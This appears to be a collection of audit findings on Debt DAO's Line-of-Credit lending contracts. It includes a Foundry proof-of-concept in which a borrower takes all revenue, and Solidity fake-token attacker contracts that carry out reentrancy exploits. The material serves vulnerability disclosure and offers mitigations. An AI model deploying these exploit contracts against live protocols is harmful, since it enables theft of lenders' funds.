# Vulnerability details

## Impact

A borrowers revenue contract is used to provide security for loans in SpigotedLine/SecuredLine. This mechanism gives security to lenders as they can use the revenue to repay some of the debt and then withdraw. 

The borrower can compromise the Spigot product and the security of the lender by creating a treasury where revenue tokens cannot be claimed by the Spigot. Thus deadlocking the Spigot. 

The lender will not be able to withdraw funds from the Spigot until debt is paid. The lender cannot use the security backed loan mechanism that is promised by the Debt DAO.

After paying the debt, the borrower can take ownership back and claim all the generated revenue to himself.

## Proof of Concept

The bug exists in `claimRevenue` function. When the function receives the revenue, it sends a portion of the funds received to the borrowers `treasury`.
If the `treasury` (controlled by the borrower) is not able to receive the funds, the transaction will revert and revenue will not be claimed. 

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L83
```
function claimRevenue(SpigotState storage self, address revenueContract, address token, bytes calldata data)
        external
        returns (uint256 claimed)
    {
        claimed = _claimRevenue(self, revenueContract, token, data);

        // splits revenue stream according to Spigot settings
        uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;
        // update escrowed balance
        self.escrowed[token] = self.escrowed[token] + escrowedAmount;

        // send non-escrowed tokens to Treasury if non-zero
        if(claimed > escrowedAmount) {
            require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));
        }

        emit ClaimRevenue(token, claimed, escrowedAmount, revenueContract);

        return claimed;
    }
```

While borrowing the condition `claimed > escrowedAmount` is false if `self.settings[revenueContract].ownerSplit` is set to `100`. This is possible only when the borrower failed to repay debt (LIQUIDATABLE).

Otherwise the condition `claimed > escrowedAmount` is always true.

When the condition is true, the borrower can revert any call to `claimRevenue` function. This results in deadlocking the Spigot mechanism.
This allows the borrower to close the debt without paying the revenue. 

When a borrower decides to pay off the debt, he gains ownership over the Spigot and revenue contract.
Then the borrower claims all of the revenue to himself.

The treasury can refuse funds in many scenarios. Here are some examples:
1. ETH token transferred to treasury, can revert in fallback() function.
2. ERC777 token transferred to treasury, revert on hook function.
3. ERC223 token transferred to treasury, revert on hook function.
4. Other customized tokens that change control to the receiver. 

Note: revenue tokens are not limited to plain ERC-20 tokens. There are popular tokens from the above format that can be used, or native ETH.

The POC will demonstrate the following scenario:
1. Borrower <-> Lender mutual agreement. Everything looks good. SpigotedLine deployed with default `borrower` as `treasury` address.
2. Lender adds 1 credit token of credit 
3. Borrower borrows 1 ETH of credit.
4. Borrower updates treasury to smart contract that refuses payments (the above mentioned token types)
5. Borrower takes his time and repays the debt close to the TTL deadline (status repaid)
6. Borrower takes back control over the Revenue contract and claims **FULL** revenue to himself.

The POC is based on ETH revenue but can also be other ERC20 based tokens that change control flow.

To execute the POC:

in mock folder, add `RevenueContract.sol":
```
pragma solidity 0.8.9;

contract RevenueContract {
    address owner;
    constructor() {
        owner = msg.sender;
    }

    function claimPullPayment(address spigotAddress) external returns(bool) {
        require(msg.sender == owner, "Revenue: Only owner can claim");
        spigotAddress.call{value: address(this).balance}("");
        return true;
    }

    function transferOwnership(address newOwner) external returns(bool) {
        require(msg.sender == owner, "Revenue: Only owner can transfer");
        owner = newOwner;
        return true;
    }

    receive() external payable {

    }
}
```

in mock folder, add the "Treasury.sol":
```
pragma solidity 0.8.9;

contract Treasury {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    receive() external payable {
        revert("Treasury not accepting money O_O");
    }
}

```

In test folder, edit `SpigotedLine.t.sol` and add the following import:
```
import { Treasury } from "../mock/Treasury.sol";
import { RevenueContract } from "../mock/RevenueContract.sol";
```

in test folder, edit `SpigotedLine.t.sol` and add the following test:
```
    function test_borrower_steal_all_revenue() public {
      uint256 lendAmount = 1 ether;
      // creat new borrower
      address ourBorrower = address(0xdeadbeef);

      // give lender 1 ETH
      deal(address(lender), lendAmount);

      // initilize a new line
      oracle = new SimpleOracle(address(revenueToken), address(creditToken));
      spigot = new Spigot(address(this), ourBorrower, ourBorrower);
      line = new SpigotedLine(
        address(oracle),
        arbiter,
        ourBorrower,
        address(spigot),
        payable(address(dex)),
        ttl,
        ownerSplit
      );
      spigot.updateOwner(address(line));
      line.init();

      // create settings for Spigot. 50% Split on revenue
      ISpigot.Setting memory setting = ISpigot.Setting({
        ownerSplit: 50,
        claimFunction: RevenueContract.claimPullPayment.selector,
        transferOwnerFunction: RevenueContract.transferOwnership.selector
      });

      // Borrower requests credit and transfers revenue contractownership to spigot.
      vm.startPrank(ourBorrower);
      line.addCredit(dRate, fRate, lendAmount, Denominations.ETH, lender);
      address revenueC = address(new RevenueContract());
      line.addSpigot(revenueC, setting);
      ISpigot newSpigot = ISpigot(line.spigot());
      revenueC.call(abi.encodeWithSelector(RevenueContract.transferOwnership.selector, address(newSpigot)));
      vm.stopPrank();

      // as arbiter needs to approve the new spigot
      vm.startPrank(arbiter);
      line.addSpigot(revenueC, setting);
      vm.stopPrank();

      // lender starts the loan and lends 1 ETH
      vm.startPrank(lender);
      bytes32 id = line.addCredit{value: lendAmount}(dRate, fRate, lendAmount, Denominations.ETH, lender);
      vm.stopPrank();

      // borrower borrows 1 ETH
      vm.startPrank(ourBorrower);
      line.borrow(id, lendAmount);
      // Borrower creates new "malicious" treasury and adds to spigot
      address newTreasury = address(new Treasury());
      newSpigot.updateTreasury(newTreasury);
      vm.stopPrank(); 

      // Some time passes.. revenue contracts has 1 ETH to share with spigot
      uint256 totalClaimRevenue = 1 ether;
      deal(revenueC, totalClaimRevenue);

      // Validation that revert is raised because treasury declined funds.
      vm.expectRevert("Treasury not accepting money O_O");
      newSpigot.claimRevenue(revenueC, Denominations.ETH, abi.encodeWithSelector(RevenueContract.claimPullPayment.selector, address(newSpigot)));

      // Borrower closes deb
      vm.startPrank(ourBorrower);
      line.depositAndClose{value: lendAmount}();

      // Borrower updates treasury to his own address
      newSpigot.updateTreasury(address(ourBorrower));

      // Borrower takes ownership of Spigot (because debt is repaid) and removes it.
      // By removing the Spigot, ownership of revenue contract is back to borrower
      line.releaseSpigot(address(ourBorrower));
      newSpigot.removeSpigot(revenueC);

      // Borrower calls revenue contract. 100% of revenue is sent to him (treasury)
      revenueC.call(abi.encodeWithSelector(RevenueContract.claimPullPayment.selector, address(ourBorrower)));
      vm.stopPrank(); 

      //validation that borrower has received all of the claimed revenue
      assert(ourBorrower.balance == totalClaimRevenue);
    }
```

To run the POC execute:
`forge test -v`

Expected output:

```
[PASS] test_borrower_steal_all_revenue() (gas: 5313016)
Test result: ok. 1 passed; 0 failed; finished in 2.71ms
```

To get full trace execute: 
`forge test -vvvv`
## Tools Used

VS Code, Foundry

## Recommended Mitigation Steps

After claiming, instead of sending the `treasury` token in the same transaction, keep `treasury` revenue in a separate accounting map and add a function for `treasury`, `operator` or `borrower` to transfer the funds to the treasury

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L401


# Vulnerability details

## Impact

Supposed four credits are already created by the lenders, so `ids = [id0, id1, id2, id3]`. The borrower calls `depositAndRepay` with the amount equal to `credit.principal + credit.interestAccrued`:
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315

So, the `principal` and `accruedInterest` of credit id0 will be equal to zero.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186-L188

And the id0 will be sent to the end of queue because it has zero-principal. So, `ids = [id1, id2, id3, id0]`.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L472

It means the borrower paid the interest and the principal of this credit, but s/he has not closed it yet (maybe in the future the borrower would like to borrow it again). Some time passes, since the lender's deposit is still in the line, only `frate` will be accounted to the interest rate (`drate` will not be accounted into the interest because the borrower has not borrowed from this credit, i.e. the principal is equal to zero).

Now, the borrower calls `close(id0)`. Since `interestAccrued` is not equal to zero (due to `frate` explained above), the body of `if statement` will be executed.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L398

In the body of `if statement`, the function `_repay(...)` is called, and after setting `accruedInterest` equal to zero, it sends the first id in the array of ids (which is now id1) to the end of queue, so, `ids = [id2, id3, id0, id1]`.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L472

Finally, `_close(...)` will be called and the id0 will be removed, so `ids = [id2, id3, 0, id1]`. 

This is not correct, because the borrower is closing the id0, why other ids should be sent to the end of que (I mean sending id1 to the end of the queue is not correct). This is messing up with the queue.

In the more severed condition, if id0 is in control of the borrower (I mean the borrower deploys a fake token contract, and by using this contract adds credit to the line as a lender), the borrower can apply reentrancy attack here:
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L401

And calls the function `close(...)` again and again through the reentrancy loop. As a result, for each call one id will be sent to the end of ques. As a result by applying the reentrancy many times equal to the number of id in the array `ids`, we will have `ids = [0, id1, id2, id3]`. This is dangerous ids structure, because the first index has value of zero, so modifier `whileBorrowing` will revert and consequently `declareInsolvent` will not be possible. 
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L83
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L143

Note that the oracle can not protect against this attack, because for example, anyone can create a fake token with some value, so the following check will be passed:
https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/utils/CreditLib.sol#L136

In summary, the borrower adds a fake token as a credit, and calls `depositAndRepay` to make the accrued interest and principal equal to zero for this credit. The borrower waits to have a nonzero accrued interest due to frate. Later calls `close(...)` and applies reentrancy in the body of `if(facilityFee > 0)` and calls `close(...)` again and again. By each call, the `_reapy` will be called and it will send one id to the end of the queue, until the id which is fully paid (principal + accrued interest) will be at index 0 of the array `ids`. 

## Proof of Concept
In the following PoC, the borrower calls the functions `attack1(...)` and `attack2(...)`, then waits some time to have a nonzero accrued interest due to `frate`. Then calls `attack3()` to exploit the protocol.
```
pragma solidity 0.8.0;

interface IDebtDAO {
    function addCredit(
        uint128 drate,
        uint128 frate,
        uint256 amount,
        address token,
        address lender
    ) external payable returns (bytes32);

    function depositAndRepay(uint256 amount) external payable returns (bool);

    function close(bytes32 id) external payable returns (bool);

    function counts() external view returns (uint256, uint256);
}

contract fakeTokenContract {
    IDebtDAO iDebtDAO;
    address lineAddress;
    uint256 numberOfCall;

    constructor(address _addr, address _line) {
        iDebtDAO = IDebtDAO(_addr);
        lineAddress = _line;
    }

    function attack1(uint128 _drate, uint128 _frate) public {
        iDebtDAO.addCredit(_drate, _frate, 1, address(this), address(this));
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        numberOfCall++;
        if (numberOfCall == 1 || numberOfCall == 2) {
            return true;
        } else {
            (uint256 count, ) = iDebtDAO.counts();
            if (count >= numberOfCall - 2) {
                attack3();
            }

        }
    }

    function attack2(uint256 _interest) public {
        iDebtDAO.depositAndRepay(1 + _interest);
    }
    // wait some time to have nonzero accrued interest due to frate
    function attack3() public {
        bytes32 id0 = keccak256(
            abi.encode(lineAddress, address(this), address(this))
        );
        iDebtDAO.close(id0);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return true;
    }
}

```

## Tools Used

## Recommended Mitigation Steps
We should not send other ids to the end of queue if we are dealing with other ids. The function `_repay(...)` should be modified as:
```
function _repay(Credit memory credit, bytes32 id, uint256 amount)
        internal
        returns (Credit memory)
    { 
        credit = CreditLib.repay(credit, id, amount);

        // if credit line fully repaid then remove it from the repayment queue
        if (credit.principal == 0 & ids[0] == id) ids.stepQ();

        return credit;
    }
```

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483


# Vulnerability details

## Impact

Suppose a line of credit contract is deployed. The borrower first calls `addCredit` by a fake token contract already deployed (so this contract plays the role of a lender), and the `token` parameter is also address of this fake token contract. So, the credit will be created and `ids = [id0]` where `id0 = keccak256(abi.encode(line, fake token contract, fake token contract))`.

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L435

Note that the oracle can not protect against this attack, because for example anyone can create a fake token with some value, so the following check will be passed:
https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/utils/CreditLib.sol#L136

Then for example 3 other honest lenders add credit to the line. So, `ids = [id0, id1, id2, id3]`. Then, the borrower borrows from these ids one by one. Note that id0 is the credit created by borrower's fake token contract, and the token address provided is a fake token contract in control of the borrower, but other ids (id1 to id3) are the real ones.

Now that the borrower borrows the fund from lenders, it is the time to apply the attack.

The borrower calls `depositAndClose`. So, the first id which is id0 is supposed to be closed. 
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L300

First, the `_accrue` is called to calculate the principal and the interest.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L301

Then, the fake token contract will be called to transfer the fund from borrower's balance to the line.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L305

Then, the function `_repay` is called. It does two tasks:
 - First, it sets accrued interest and principal equal to zero.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L469
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186-L188
 - Second, it sends the id0 to the end of queues. So, `ids = [id1, id2, id3, id0]`.

Then, the function `_close(...)` is called. It first calls the fake token contract.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488

Then, in the fake token contract, the borrower applies reentrancy attack, and calls `close(id0)`. Note that bypassing the ` if(msg.sender != credit.lender && msg.sender != b)`, is not an issue, because the lender is the fake token contract.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388

This function will not go in the if phrase `if(facilityFee > 0)` because it is already paid.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L398

This function then calls `_close(...)`.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L406

Again in the function `_close(...)`, the fake token contract address will be called, and the same reentrancy can apply. Suppose, applying this loop of reentrancy  4 times, equal to the length of ids (or the value of `count`). In the last call of `_close(...)` (I mean the 4th reentrancy call), it will delete `credits[id0]` and remove position id0. So, `ids = [id1, id2, id3, 0]`, and count will be decreased by one and will be equal to 3. Then in the 3rd call of reentrancy loop, the same happens again and count will be equal to 2. Note that, the `removePosition` function does not protect against this attack, because it does not care id0 is in ids array or not, and it always return true, and even the return Boolean is not checked. Finally, the count will be equal to zero and the status of the line will be updated as `REPAID`.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L495-L502

While still other lender's funds are in the line, the status of line is set to `REPAID`. It means the modifiers `whileActive` and `whileBorrowing` will revert, so the function `declareInsolvent` can not be called. 
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L143

Moreover, the lender can not withdraw, because the lent amount are borrowed by the borrower, so there is not liquidity in the line.
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L380
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L211

In summary, the borrower adds credit with a fake token, and later closes this credit. During closing this credit, reentrancy attack is applied, so instead of decreasing the value of count by one, it is decreased by the number of times the reentrancy is applied, until count becomes zero, and the status of line of credit becomes `REPAID`.

Now that the status is `REPAID`, the borrower calls `sweep(...)` to send revenue or credit tokens to the borrower:
https://github.com/debtdao/Line-of-Credit/blob/c1037d7f873cfb2af48fdaf00e44cd55c7737fc1/contracts/utils/SpigotedLineLib.sol#L217

## Proof of Concept
```
pragma solidity 0.8.0;

interface IDebtDAO {
    function addCredit(
        uint128 drate,
        uint128 frate,
        uint256 amount,
        address token,
        address lender
    ) external payable returns (bytes32);

    function depositAndClose() external payable returns (bool);

    function close(bytes32 id) external payable returns (bool);

    function counts() external view returns (uint256, uint256);
}

contract fakeTokenContract {
    IDebtDAO iDebtDAO;
    address lineAddress;
    uint256 numberOfReentrancy;

    constructor(address _addr, address _line) {
        iDebtDAO = IDebtDAO(_addr);
        lineAddress = _line;
    }

    function attack1(uint128 _drate, uint128 _frate) public {
        iDebtDAO.addCredit(_drate, _frate, 1, address(this), address(this));
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        return true;
    }

    function attack2() public {
        iDebtDAO.depositAndClose();
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        numberOfReentrancy++;
        (uint256 count, ) = iDebtDAO.counts();
        if (count > numberOfReentrancy) {
            bytes32 id0 = keccak256(
                abi.encode(lineAddress, address(this), address(this))
            );
            iDebtDAO.close(id0);
        }
    }
}

```

## Tools Used

## Recommended Mitigation Steps
 - Reentrancy protection is necessary.
 - Remove position function should be modified to return false in case the id is not in the array `ids`, and the return bool should be checked by the caller of this function.

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/oracle/Oracle.sol#L22


# Vulnerability details

## Impact

The current implementation of FeedRegistryInterface is used without roundId, startedAt, timeStamp and answeredInRound properties. Not checking how stale the answer is could lead to stale prices according to the Chainlink documentation.

## Proof of Concept

```solidity
function getLatestAnswer(address token) external returns (int) {
    (
        /* uint80 roundID */,
        int price,
        /* uint80 startedAt */,
        /* uint80 timeStamp */,
        /* uint80 answeredInRound */
    ) = registry.latestRoundData(token, Denominations.USD);

    return price;
}
```

## Tools Used

VScode

## Recommended Migration Steps

Consider adding the missing checks for stale data.

```solidity
require(answer > 0, "Chainlink price <= 0");
require(answeredInRound >= roundID, "Stale price");
require(block.timestamp -  updatedAt <= MAX_ORACLE_FRESHNESS_SECONDS>, "Last price update was too long ago.");
```

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L38


# Vulnerability details

## Impact

Borrower can bypass the `mutualConsent` modifier by calling `addCredit` twice with following parameters:
 - drate: something
 - frate: something
 - amount: something
 - token: a fake token contract in control of the borrower
 - lender: borrower address

In the first call, we will have `mutualConsents[keccak256(abi.encodePacked(FuncSig+borrower+borrower, borrower))] = true`, and the `_mutualConsent(...)` returns false.
And, in the second call, it will return true, so the borrower can add credit.

```
function _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {
        if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }

        address nonCaller = _getNonCaller(_signerOne, _signerTwo);

        // The consent hash is defined by the hash of the transaction call data and sender of msg,
        // which uniquely identifies the function, arguments, and sender.
        bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));

        if (!mutualConsents[expectedHash]) {
            bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));

            mutualConsents[newHash] = true;

            emit MutualConsentRegistered(newHash);

            return false;
        }

        delete mutualConsents[expectedHash];

        return true;
    }
```
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L38

Note that the oracle can not protect against this attack, because for example anyone can create a fake token with some value, so the following check will be passed:
https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/utils/CreditLib.sol#L136

As a result, the borrower can increase the number of ids (i.e. the number of lenders) unlimitedly. Suppose, the borrower does this to the point that the number of ids will be too much. In this case the functions `_updateOutstandingDebt` and `accrueInterest` will be useless, because whenever they are called it will revert because of unhandled gas consumption in the for loops:

```
function _updateOutstandingDebt()
        internal
        returns (uint256 principal, uint256 interest)
    {
        // use full length not count because positions might not be packed in order
        uint256 len = ids.length;
        if (len == 0) return (0, 0);

        bytes32 id;
        address oracle_ = address(oracle);  // gas savings
        address interestRate_ = address(interestRate); // gas savings

        for (uint256 i; i < len; ++i) {
            id = ids[i];

            // null element in array from closing a position. skip for gas savings
            if(id == bytes32(0)) { continue; }

            (Credit memory c, uint256 _p, uint256 _i) = CreditLib.getOutstandingDebt(
              credits[id],
              id,
              oracle_,
              interestRate_
            );
            // update total outstanding debt
            principal += _p;
            interest += _i;
            // save changes to storage
            credits[id] = c;
        }
    }
```
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L179

